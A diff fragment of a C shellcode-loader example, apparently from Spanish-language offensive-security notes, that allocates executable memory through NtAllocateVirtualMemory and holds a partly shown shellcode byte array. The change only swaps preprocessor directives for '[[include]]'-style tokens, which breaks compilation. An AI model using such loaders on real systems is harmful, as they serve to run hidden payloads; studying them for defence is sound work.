@@ -271,12 +271,12 @@ Ejecutar shellcode reservando memoria en el proceso actual con permisos de lectu
  *
  */
 
-#include <stdint.h>
-#include <stdio.h>
-#include <windows.h>
-#include <string.h>
+[[include]] <stdint.h>
+[[include]] <stdio.h>
+[[include]] <windows.h>
+[[include]] <string.h>
 
-#pragma comment(lib, "ntdll")
+[[pragma]] comment(lib, "ntdll")
 
 typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryPtr)(
     HANDLE             ProcessHandle,
@@ -302,8 +302,8 @@ static uint8_t code[] =
     "\x48\x83\xec\x20\x41\xff\xd6";
 SIZE_T size_of_code = sizeof(code); // tamaño del shellcode
 
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
+[[define]] NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+[[define]] NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
 
 int main() {
 
